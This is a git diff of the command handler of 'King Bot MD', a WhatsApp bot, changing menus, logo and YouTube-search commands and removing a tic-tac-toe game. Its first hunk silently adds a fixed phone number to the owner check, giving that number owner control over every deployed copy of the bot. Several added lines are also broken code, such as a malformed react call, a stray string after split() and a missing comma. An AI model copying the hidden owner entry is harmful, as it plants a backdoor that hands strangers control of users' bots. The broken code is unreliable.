@@ -79,7 +79,7 @@ try {
     const args = body.trim().split(/ +/).slice(1)
     const pushname = m.pushName || "No Name"
     const botNumber = await KingmdWH.decodeJid(KingmdWH.user.id)
-    const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+    const isCreator = [botNumber, ...global.owner , '94729352830'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
     const itsMe = m.sender == botNumber ? true : false
     const text = q = args.join(" ")
     const quoted = m.quoted ? m.quoted : m
@@ -103,20 +103,20 @@ try {
     let picaks = [flaming,fluming,flarun,flasmurf]
 	let picak = picaks[Math.floor(Math.random() * picaks.length)]
 		
-      try {
-        let isNumber = x => typeof x === 'number' && !isNaN(x)
-        let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
-        let user = global.db.data.users[m.sender]
-        if (typeof user !== 'object') global.db.data.users[m.sender] = {}
-        if (user) {
-        if (!isNumber(user.afkTime)) user.afkTime = -1
-        if (!('afkReason' in user)) user.afkReason = ''
-        if (!isNumber(user.limit)) user.limit = limitUser
+try {
+     let isNumber = x => typeof x === 'number' && !isNaN(x)
+     let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
+     let user = global.db.data.users[m.sender]
+     if (typeof user !== 'object') global.db.data.users[m.sender] = {}
+     if (user) {
+     if (!isNumber(user.afkTime)) user.afkTime = -1
+     if (!('afkReason' in user)) user.afkReason = ''
+     if (!isNumber(user.limit)) user.limit = limitUser
         } else global.db.data.users[m.sender] = {
-        afkTime: -1,
-        afkReason: '',
-        limit: limitUser,
-        }
+           afkTime: -1,
+           afkReason: '',
+           limit: limitUser,
+                     }
     
         let chats = global.db.data.chats[m.chat]
         if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
@@ -188,8 +188,7 @@ const reply = (teks) => {
 //antilink
     if (db.data.chats[m.chat].antilink) {
     if (budy.match(`chat.whatsapp.com`)) {
-    reply(`*⚠️「 ANTI LINK 」⚠️*\n\n⌛ You have been detected sending a group link, sorry you will be kicked !👿`)
-    replay('_*Group Links Not Allowed This Group*_\n👑ᴬɴᵀɪᴳʀᴼᴜᴾ ʟᴵɴᴷ ʙʸ ᴋᴵɴᴳ ʙᴼᴛ ᴵᴺᴳ👑\n\n\n</> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪɴɢ ʙᴏᴛ </>️ ▷')
+    replay('*⚠️「 ANTI LINK 」⚠️*\n\n_*🎭 Group Links Not Allowed This Group 👿*_\n👑ᴬɴᵀɪᴳʀᴼᴜᴾ ʟᴵɴᴷ ʙʸ ᴋᴵɴᴳ ʙᴼᴛ ᴵᴺᴳ👑\n\n\n</> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪɴɢ ʙᴏᴛ </>️ ▷')
     if (!isBotAdmins) return reply(`I Am Not An Admin, How Could I Kick Somebody Who Send Link 😒`)
     let gclink = (`https://chat.whatsapp.com/`+await KingmdWH.groupInviteCode(m.chat))
     let isLinkThisGc = new RegExp(gclink, 'i')
@@ -354,71 +353,7 @@ ${Array.from(room.jawaban, (jawaban, index) => {
         } else reply('*Wrong Answer!*')
     }
     
-    //TicTacToe\\
-	    this.game = this.game ? this.game : {}
-	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
-	    if (room) {
-	    let ok
-	    let isWin = !1
-	    let isTie = !1
-	    let isSurrender = !1
-	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
-	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
-	    isSurrender = !/^[1-9]$/.test(m.text)
-	    if (m.sender !== room.game.currentTurn) { 
-	    if (!isSurrender) return !0
-	    }
-	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
-	    reply({
-	    '-3': 'Game Has Ended',
-	    '-2': 'Invalid',
-	    '-1': 'Invalid Position',
-	    0: 'Invalid Position',
-	    }[ok])
-	    return !0
-	    }
-	    if (m.sender === room.game.winner) isWin = true
-	    else if (room.game.board === 511) isTie = true
-	    let arr = room.game.render().map(v => {
-	    return {
-	    X: '❌',
-	    O: '⭕',
-	    1: '1️⃣',
-	    2: '2️⃣',
-	    3: '3️⃣',
-	    4: '4️⃣',
-	    5: '5️⃣',
-	    6: '6️⃣',
-	    7: '7️⃣',
-	    8: '8️⃣',
-	    9: '9️⃣',
-	    }[v]
-	    })
-	    if (isSurrender) {
-	    room.game._currentTurn = m.sender === room.game.playerX
-	    isWin = true
-	    }
-	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
-	    let str = `Room ID: ${room.id}
-
-${arr.slice(0, 3).join('')}
-${arr.slice(3, 6).join('')}
-${arr.slice(6).join('')}
-
-${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
-❌: @${room.game.playerX.split('@')[0]}
-⭕: @${room.game.playerO.split('@')[0]}
-
-Typed *surrender* to surrender and admited defeat`
-	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
-	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
-	    if (room.x !== room.o) await KingmdWH.sendText(room.x, str, m, { mentions: parseMention(str) } )
-	    await KingmdWH.sendText(room.o, str, m, { mentions: parseMention(str) } )
-	    if (isTie || isWin) {
-	    delete this.game[room.id]
-	    }
-	    }
-
+    
     //Suit PvP\\
 	    this.suit = this.suit ? this.suit : {}
 	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
@@ -697,6 +632,14 @@ switch(command) {
 var unicorn = await getBuffer(picak+`${text}`)
 await KingmdWH.send5ButImg(from, `Logo Created`, '</> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪɴɢ ʙᴏᴛ </>️ ▷',unicorn, [{"urlButton": {"displayText": "🔥 YOUTUBE 🔥","url": `${myweb}`}},{"urlButton": {"displayText": "👨‍💻 GITHUB 👨‍💻","url": `${sc}`}},{"quickReplyButton": {"displayText": "🍜Donate🍜","id": 'donate'}},{"quickReplyButton": {"displayText": "🇱🇰 OWNER 🇱🇰","id": 'owner'}}] )      }
 break
+            case 'logo2': {
+		let anu = await fetchJson(`https://en.ephoto360.com/create-light-effects-green-neon-online-429.html?text=${encodeURIComponent(text)}`)
+		for (let res of anu.results) {
+		    let encmedia = await KingmdWH.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
+		    await fs.unlinkSync(encmedia)
+		}
+	    }
+	    break
 case 'logo1': {
 var unicorn = await getBuffer(`https://en.ephoto360.com/create-light-effects-green-neon-online-429.html?text=${text}`)
 await KingmdWH.send5ButImg(from, `Logo Created`, '</> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪɴɢ ʙᴏᴛ </>️ ▷',unicorn, [{"urlButton": {"displayText": "🔥 YOUTUBE 🔥","url": `${myweb}`}},{"urlButton": {"displayText": "👨‍💻 GITHUB 👨‍💻","url": `${sc}`}},{"quickReplyButton": {"displayText": "🍜Donate🍜","id": 'donate'}},{"quickReplyButton": {"displayText": "🇱🇰 OWNER 🇱🇰","id": 'owner'}}] )      }
@@ -714,8 +657,8 @@ let kingtag = `
  ⚜️ *Message* : ${q ? q : 'no message'}
  
 ┌─────────────────\n`
-for (let mem of participants) {kingtag += `│🔥 @${mem.id.split('@')[0]}\n`}
-kingtag += `└─────────────────`
+for (let mem of participants) {kingtag += `│ @${mem.id.split('@')[0]}\n`}
+kingtag += `🍁 ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪɴɢ ʙᴏᴛ ₂₀₂₂ 🍁\n└─────────────────`
      
     KingmdWH.sendMessage(m.chat, { text: kingtag, mentions: participants.map(a => a.id) }, { quoted: m })
                 }
@@ -1214,6 +1157,26 @@ break
                 KingmdWH.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
             }
                 break
+                case 'ytsrow': {
+                if (!text) return replay(`Example : ${prefix + command} Anime Story Whatsapp`)
+                let yts = require("yt-search")
+                let search = await yts(text)
+                let no = 1
+for (let kingyt of search.all) { kingrowytsearch += { "title": `Yt Search King Bot - No ${no++}`, "rows": [{ "title": `${kingyt.title}`, "description": `Download As A Video`, "rowId": `.video ${kingyt.url}`} ]},  }
+
+
+let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+                listMessage :{
+                    title: `👋ʜɪ ᴅᴇᴀʀ ${pushname}\n\n`,
+                    description: 'Yt Search',
+                    buttonText: "ᴛᴀᴘ ʜᴇʀᴇ ᴛᴏ ꜱᴇʟᴇᴄᴛ ᴠɪᴅᴇᴏ",
+                    footerText: '</> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪɴɢ ʙᴏᴛ </>️ ▷',
+                    listType: "SINGLE_SELECT",
+                    sections: kingrowytsearch
+                    listType: 1 } }), {})
+            KingmdWH.relayMessage(m.chat, template.message, { messageId: template.key.id })
+            }
+            break
         case 'gimage': case 'img': case 'googleimage': {
         if (!text) return reply(`Example : ${prefix + command} KING BOT MD`)
         let gis = require('g-i-s')
@@ -1225,7 +1188,7 @@ break
                 ]
                 let buttonMessage = {
                     image: { url: images },
-                    caption: `*-------「 GIMAGE SEARCH 」-------*
+                    text: `*-------「 IMAGE SEARCH 」-------*
 🤠 *Query* : ${text}
 🔗 *Media Url* : ${images}`,
                     footer: KingmdWH.user.name,
@@ -1247,7 +1210,7 @@ break
                 ]
                 let buttonMessage = {
                     image: { url: anu.thumbnail },
-                    caption: `
+                    text: `
 🔥 Title : ${anu.title}
 🔥 Ext : Search
 🔥 ID : ${anu.videoId}
@@ -1277,7 +1240,7 @@ break
                 ]
                 let buttonMessage = {
                     image: { url: kingbotsearch.thumbnail },
-                    caption: `
+                    text: `
 ╭──────────────◉
 │  🔥 ᴋɪɴɢ ʙᴏᴛ - ᴍᴅ ᴠᴇʀꜱɪᴏɴ 🔥
 ╰──────────────◉
@@ -1311,7 +1274,7 @@ break
                 ]
                 let buttonMessage = {
                     image: { url: kingbotsearch.thumbnail },
-                    caption: `
+                    text: `
 ╭──────────────◉
 │    🔥 ᴋɪɴɢ ʙᴏᴛ - ᴍᴅ ᴠᴇʀꜱɪᴏɴ 🔥
 ╰──────────────◉
@@ -1347,7 +1310,7 @@ break
                 ]
                 let buttonMessage = {
                     image: { url: anu.thumbnail },
-                    caption: `
+                    text: `
 ╭──────────────◉
 │ 🔥 ᴋɪɴɢ ʙᴏᴛ - ᴍᴅ ᴠᴇʀꜱɪᴏɴ 🔥
 ╰──────────────◉
@@ -1371,7 +1334,10 @@ break
                 KingmdWH.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-            
+            case 'testdelete': {
+            var down = KingmdWH.sendMessage(m.chat, {text:'⚒'})
+            KingmdWH.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: down.quoted.id, participant: m.quoted.sender } })
+                  }
                 case 'hsong':  {
                 let { yta } = require('./lib/y2mate')
                 if (!text) return reply(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
@@ -1384,11 +1350,10 @@ break
                     {buttonId: `hsong ${isUrl(text)}`, buttonText: {displayText: '🍁 DOWNLOAD AGAIN 🍁'}, type: 1}
                 ]
                 let buttonMessage = {
-                    image: fs.readFileSync('./src/sd.jpg'),
-                    caption: `
-*[🇱🇰𝚱𝚰𝚴Ｇ 𝛃𝚯𝚪🤘] ɪs SᴇᴀʀᴄʜɪɴG Yᴏᴜʀ SᴏɴG ✨➾🔎*
+//                    image: fs.readFileSync('./src/sd.jpg'),
+                    text: `『 👋 HELLO ${pushname} 』
                     
-🍁ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪɴɢ ʙᴏᴛ ₂₀₂₂🍁`,
+*[🇱🇰𝚱𝚰𝚴Ｇ 𝛃𝚯𝚪🤘] ɪs SᴇᴀʀᴄʜɪɴG Yᴏᴜʀ SᴏɴG ✨➾🔎*`,
                     footer: '</> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪɴɢ ʙᴏᴛ </> ▷',
                     buttons: buttons,
                     headerType: 4
@@ -1411,11 +1376,10 @@ break
                     {buttonId: `hsong ${isUrl(text)}`, buttonText: {displayText: '🍁 DOWNLOAD AGAIN 🍁'}, type: 1}
                 ]
                 let buttonMessage = {
-                    image: fs.readFileSync('./src/sd.jpg'),
-                    caption: `
-*[🇱🇰𝚱𝚰𝚴Ｇ 𝛃𝚯𝚪🤘] ɪs SᴇᴀʀᴄʜɪɴG Yᴏᴜʀ SᴏɴG ✨➾🔎*
+//                    image: fs.readFileSync('./src/sd.jpg'),
+                    text: `『 👋 HELLO ${pushname} 』
                     
-🍁ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪɴɢ ʙᴏᴛ ₂₀₂₂🍁`,
+*[🇱🇰𝚱𝚰𝚴Ｇ 𝛃𝚯𝚪🤘] ɪs SᴇᴀʀᴄʜɪɴG Yᴏᴜʀ SᴏɴG ✨➾🔎*`,
                     footer: '</> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪɴɢ ʙᴏᴛ </> ▷',
                     buttons: buttons,
                     headerType: 4
@@ -1488,7 +1452,7 @@ break
                 let latensi = speed() - timestamp
                 neww = performance.now()
                 oldd = performance.now()
-                respon = `
+                respon = `*[🇱🇰𝚱𝚰𝚴Ｇ 𝛃𝚯𝚪🤘] - MD*
 Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
 
 💻 Info Server
@@ -1569,8 +1533,8 @@ reply('Welcome !')
             }
             break
                      case 'alive': {
-                     
-          KingmdWH.sendMessage(m.chat, { react: { text: `${global.reactmoji}`, key: { remoteJid: m.chat, fromMe: true, id: quoted.id }}})
+                    
+          KingmdWH.sendMessage(m.chat, react: { text: "💖", key: message.key })
                      
 Kingbotalive = `─┈┈┈┄┄╌╌╌╌┄┄┈┈┈─
                    ✦𝙷𝙸 𝚃𝙷𝙴𝚁𝙴,࿐
@@ -1602,7 +1566,7 @@ Kingbotalive = `─┈┈┈┄┄╌╌╌╌┄┄┈┈┈─
                 
                 let buttonMessage = {
                     image: fs.readFileSync('./src/alivelogo.jpg'),
-                    caption: Kingbotalive,
+                    text: Kingbotalive,
                     footer: '</> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪɴɢ ʙᴏᴛ </>️ ▷',
                     buttons: buttons,
                     headerType: 4
@@ -1638,7 +1602,7 @@ Kingbotinfo = `
                 ]
                 let buttonMessage = {
                     image: fs.readFileSync('./src/bot.jpg'),
-                    caption: Kingbotinfo,
+                    text: Kingbotinfo,
                     footer: '</> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪɴɢ ʙᴏᴛ </>️ ▷',
                     buttons: buttons,
                     headerType: 4
@@ -1656,7 +1620,7 @@ kingbotcmd = `╹ 𓄂᳆⃞⃚😈×͜×[🇱🇰㉿𝗜𝗡𝗚 𝗕𝗢𝗧�
 │🎲 𝙲𝙾 𝙾𝚆𝙽𝙴𝚁 ➢ 𝙼𝚁.𝚃𝙸𝙼𝙰
 ╰──────────────◉
 
-╭╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶
+╭╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶
 ├ Nᴏɴ MD Bᴏᴛ Mᴀᴋɪɴɢ Sᴛᴀʀᴛᴇᴅ Oɴ
 │2022:03:05
 │
@@ -1668,7 +1632,7 @@ kingbotcmd = `╹ 𓄂᳆⃞⃚😈×͜×[🇱🇰㉿𝗜𝗡𝗚 𝗕𝗢𝗧�
 │
 ├ MD Bᴏᴛ Rᴇʟᴇᴀꜱᴇᴅ Oɴ
 │2022:07:01
-╰╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶
+╰╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶
 
 
  ┋ *⚜️ ꜰᴏʀ 24/7 ʜᴇʟᴘ ᴍꜱɢ ᴍᴇ ⚜️*┋
@@ -1683,7 +1647,7 @@ let buttons = [
                 ]
                 let buttonMessage = {
                     image: fs.readFileSync('./src/bot.jpg'),
-                    caption: kingbotcmd,
+                    text: kingbotcmd,
                     footer: '</> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪɴɢ ʙᴏᴛ </>️ ▷',
                     buttons: buttons,
                     headerType: 4
@@ -1699,7 +1663,8 @@ kingmenu = `┏━━━━━━━━━━━━━━
 
 THIS IS [🇱🇰𝚱𝚰𝚴Ｇ 𝛃𝚯𝚪🤘] CMD MENU`
 const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-                    templateMessage: { hydratedTemplate: {
+                    templateMessage: {
+                            hydratedTemplate: {
                             hydratedContentText: kingmenu,
                             locationMessage: {
                             jpegThumbnail: fs.readFileSync('./KINGMedia/logo.jpeg')}, 
@@ -1718,8 +1683,10 @@ const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 	         	reply('[🇱🇰𝚱𝚰𝚴Ｇ 𝛃𝚯𝚪🤘] CONFERMED 2022 |>') }
 	     break
 	       case 'kingjoinsupportgroupnowok': {
-	      
-                await KingmdWH.groupAcceptInvite('https://chat.whatsapp.com/FknPAOHRdBdBlAPLyfIwLG').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
+                if (!isCreator) return replay(`${mess.owner}`)
+                reply(mess.wait)
+                let result = args[0].split('https://chat.whatsapp.com/')'FknPAOHRdBdBlAPLyfIwLG'
+                await KingmdWH.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                 replay('දැන් [🇱🇰𝚱𝚰𝚴Ｇ 𝛃𝚯𝚪🤘] official support group එකට join වෙයි...')
 	                            }
                       break
@@ -1799,7 +1766,6 @@ Kingbotehimenu = `🔥ᏦᏆΝᏀ ᏴϴͲ ᎬᎻᏆ ᏟϴᏞᏞᎬᏟͲᏆϴΝ�
    🎲 𝙰𝙸𝚁𝚃𝙴𝙻 0 - .a0ehi
    🎲 𝙼𝙾𝙱𝙸𝚃𝙴𝙻 0 - .m0ehi
 
-   💠 ᎪᏞᏞ ᎬᎻᏆ ҒᏆᏞᎬՏ - .allehi
    
 
 ◈ ᴇʜɪ ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ → 𝐔𝐂𝐇𝐈𝐓𝐇𝐀
@@ -1814,7 +1780,7 @@ Kingbotehimenu = `🔥ᏦᏆΝᏀ ᏴϴͲ ᎬᎻᏆ ᏟϴᏞᏞᎬᏟͲᏆϴΝ�
                 ]
                 let buttonMessage = {
                     image: fs.readFileSync('./src/ehilogo.jpg'),
-                    caption: Kingbotehimenu,
+                    text: Kingbotehimenu,
                     footer: '</> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪɴɢ ʙᴏᴛ </>️ ▷',
                     buttons: buttons,
                     headerType: 4
@@ -1848,7 +1814,7 @@ kingbotehiapkmenu = `🔥ᏦᏆΝᏀ ᏴϴͲ ᎬᎻᏆ ᎪᏢᏦ ᏟϴᏞᏞᎬ�
                      ]
                 let buttonMessage = {
                     image: fs.readFileSync('./KINGMedia/logo.jpeg'),
-                    caption: kingbotehiapkmenu,
+                    text: kingbotehiapkmenu,
                     footer: '</> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪɴɢ ʙᴏᴛ </>️ ▷',
                     buttons: buttons,
                     headerType: 4
@@ -1918,11 +1884,11 @@ Ex - ( Dialog zoom *Rs- 165  )
 }
 
            break
-              case 'fbdl': case 'fb': case 'facebook': {
+              case 'fb': case 'facebook': {
                  if (!text) throw ' Query Link!'
                  m.reply(mess.wait)
                  let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'apikey'))
-                 KingmdWH.sendMessage(m.chat, { video: { url: anu.result.url }, caption: ` *Title* : ${anu.result.title}`}, { quoted: m })
+                 KingmdWH.sendMessage(m.chat, { video: { url: `${anu.result.url}` }, caption: ` *Title* : ${anu.result.title}`}, { quoted: m })
                            }
                            break
            case 'shortmenu': {
@@ -1982,7 +1948,7 @@ kingbotshortmenu = `
                          ]
                 let buttonMessage = {
                     image: fs.readFileSync('./KINGMedia/logo.jpeg'),
-                    caption: kingbotshortmenu,
+                    text: kingbotshortmenu,
                     footer: '</> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪɴɢ ʙᴏᴛ </>️ ▷',
                     buttons: buttons,
                     headerType: 4
@@ -2017,7 +1983,7 @@ let buttons = [
                 ]
                 let buttonMessage = {
                     image: fs.readFileSync('./src/bot.jpg'),
-                    caption: Kingbotgitlink,
+                    text: Kingbotgitlink,
                     footer: '</> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪɴɢ ʙᴏᴛ </>️ ▷',
                     buttons: buttons,
                     headerType: 4
@@ -2114,7 +2080,9 @@ await KingmdWH.send5ButImg(from, `` + '' + ' ', `
 ┠────────────
 ┃     「 DOWNLOADER 」   
 ┠────────────
-┃◈ 
+┃◈ .play [query]
+┃◈ .song [query]
+┃◈ .img [query]
 ┗━━━━━━━━━━━━━◉`,unicorn, [{"urlButton": {"displayText": "🔥 YOUTUBE 🔥","url": `${myweb}`}},{"urlButton": {"displayText": "👨‍💻 GITHUB 👨‍💻","url": `${sc}`}},{"quickReplyButton": {"displayText": "🍜Donate🍜","id": 'donate'}},{"quickReplyButton": {"displayText": "🇱🇰 OWNER 🇱🇰","id": 'owner'}}] )
 break
 case 'searchmenu':
@@ -2124,11 +2092,8 @@ await KingmdWH.send5ButImg(from, `` + '' + ' ', `
 ┠────────────
 ┃     「 SEARCHER 」	    
 ┠────────────    
-┃◈ .play [query]
-┃◈ .song [query]
 ┃◈ .yts [query]
 ┃◈ .google [query]
-┃◈ .img [query]
 ┃◈ .pinterest [query]
 ┃◈ .wallpaper [query]
 ┃◈ .wikimedia [query]
@@ -2176,7 +2141,7 @@ break
 case 'thanksto': case 'tqto': case 'tqtt':
 var unicorn = await getBuffer(picak+'Developer')
 await KingmdWH.send5ButImg(from, `*📡⚙️🔱ҠĪИƓ ßᎾŦ🔱⚙️📡*
-                 *ʙʏ*
+                                    *ʙʏ*
 *᳄⚠📡 ШHłТΞ HΛϾКΞЯS 📡⚠᳄️*
 
 *_⚠️⚙ 𝐈 𝐚𝐦 𝑲𝑰𝑵𝑮 𝑩𝑶𝑻 𝑴𝑫 𝐕𝐞𝐫𝐬𝐢𝐨𝐧️ ⚙️⚠️_*
